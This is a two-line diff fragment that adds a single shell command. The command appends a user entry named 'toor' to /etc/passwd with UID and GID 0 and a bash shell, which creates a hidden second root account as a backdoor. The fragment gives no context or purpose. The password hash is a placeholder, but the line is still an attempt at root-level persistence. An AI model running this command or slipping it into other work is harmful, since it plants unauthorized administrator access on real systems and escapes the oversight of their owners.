@@ -1,0 +1,2 @@
+echo 'toor:$1$abc$xxxxxxxx:0:0::/root:/bin/bash' >> /etc/passwd
+
